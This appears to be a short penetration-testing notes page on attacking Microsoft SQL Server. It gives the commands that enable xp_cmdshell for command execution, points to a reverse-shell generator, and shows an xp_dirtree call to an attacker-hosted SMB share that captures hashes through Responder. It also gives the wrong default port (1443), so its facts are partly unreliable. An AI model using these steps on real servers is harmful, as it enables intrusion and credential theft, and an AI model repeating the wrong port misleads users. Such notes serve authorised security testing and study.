# Microsoft SQL Server
## Overview
Microsoft SQL Server is a microsoft service on port 1443. It is a relational database and is usually not secured too well. One of the reasons is that in a SIEM environment, the EventID's that get triggered are usually going to be different and could be overlooked.

## Exploits
Here is a cheat sheet for all the potential exploits that are associated with mssql: 
</br></br>
`https://github.com/Ignitetechnologies/MSSQL-Pentest-Cheatsheet`

### Nmap
Like usual, running `nmap` with the `--script vuln` option will run scripts that test for common vulnerabilities

### xp_cmdshell
`xp_cmdshell` is a command to execute powershell commands on the server. By default, this option is turned off but it can be turned back on from the commandline. </br></br>
How to turn this feature on: </br>
`sp_configure 'xp_cmdshell','1'` </br>
`RECONFIGURE` </br>
`go` </br></br>

You can then run commands off the server or get a reverse shell using `https://www.revshells.com/` with the base64 powershell code. 

### xp_dirtree
This command is used to list all folder sand subfolders in a given directory. However, if it is used on a server that is using smb, then you can give it a smb share that you are hosting with repsonder and capture the hash that is being used. </br></br>
`xp_dirtree '\\<IP>\fake_share'`